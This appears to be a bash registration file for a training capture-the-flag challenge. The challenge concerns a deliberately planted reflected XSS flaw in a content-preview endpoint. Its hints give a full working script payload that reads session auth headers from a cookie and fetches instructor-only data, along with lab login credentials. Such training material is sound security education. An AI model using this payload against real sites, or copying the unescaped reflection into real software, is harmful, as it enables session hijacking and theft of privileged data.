#!/usr/bin/env bash
# =============================================================================
#  Easy - Reflected XSS: Content Preview   (REAL CoLab app, browser)
#  CoLab's content-preview endpoint reflects the submitted `html` parameter into
#  a SERVER-RENDERED page with no output encoding (ContentPreviewController#show).
#  A <script> in the URL runs in the browser. Opened by a logged-in instructor,
#  an attacker's preview link executes JS in the instructor's session and reads
#  instructor-only data (GET /instructor/xss_flag) a student can't reach directly.
#
#  TRAINING PLATFORM: the reflection is embedded in a REAL CoLab controller
#  (CTF/lab-setup/patch_xss.rb) and renders through the live app. (CoLab's React
#  SPA auto-escapes output, so the exploitable sink is this server-rendered page -
#  which is exactly why output encoding matters.) Simple -> done in the browser.
# =============================================================================

xss_provision() { return 0; }   # endpoints embedded out-of-band (apply-embeds.ps1)

xss_handle() {
  mw_resp "200 OK" '{"note":"Reflected XSS against the REAL CoLab app, in the browser. Type !hint."}' \
    "Content-Type: application/json"
}

register_challenge \
  id="easy-xss" \
  title="Reflected XSS: Content Preview - Medium" \
  diff="Medium" points="250" \
  owasp="A03:2021 Injection (Cross-Site Scripting)" \
  cvss="6.1 (AV:N/UI:R/S:C)" \
  slug="reflected_xss_preview" \
  finding="CoLab Pentest Report - unescaped reflection in the content-preview endpoint" \
  endpoint="GET /content/preview?html=...  (reflected, unescaped)" \
  tools="browser" \
  scenario="CoLab has a content-preview tool that takes rich-text HTML and shows how it will render. The problem: it drops your input straight into the page without escaping it, so anything you put in the html parameter runs as real markup - including <script>. If you can get a logged-in instructor to open your preview link, your script runs in THEIR session and can read staff-only data they're authorized for but you are not." \
  objective="Confirm the preview reflects HTML unescaped, then (as a logged-in instructor) use a reflected-XSS payload that reads the instructor-only secret at /instructor/xss_flag and prints the flag on the page." \
  remediation="Context-aware output-encode all reflected user input (escape HTML); add a strict Content-Security-Policy; never render user HTML as trusted. HttpOnly auth cookies limit script access to session tokens." \
  browse="https://localhost:13443/content/preview?html=%3Ch3%3EHello%20preview%3C/h3%3E" \
  live="https://localhost:13443/content/preview?html=%3Ch3%3EHello%20preview%3C/h3%3E" \
  hints="First prove it reflects HTML unescaped. Open: https://localhost:13443/content/preview?html=<b>bold</b> - the word is bold, so your markup is rendered, not escaped. Try <script>alert(document.domain)</script> and the alert pops: that's XSS.
This flag lives at /instructor/xss_flag, which only an instructor may read. So log in to CoLab first as the instructor: instructor@colab.test / Spring2025! (that stores your session the script can use).
Now open a preview URL whose html param is a script that steals it - paste this into the address bar (one line):
  https://localhost:13443/content/preview?html=<script>fetch('/instructor/xss_flag.json',{headers:JSON.parse(decodeURIComponent((document.cookie.match(/colab_authHeaders=([^;]+)/)||[0,'%7B%7D'])[1]))}).then(r=>r.json()).then(d=>document.getElementById('preview').innerHTML='FLAG: '+d.flag)</script>
The page prints FLAG: CoLab{...} - your script ran with the instructor's privileges and read staff-only data." \
  provision="xss_provision" handler="xss_handle"
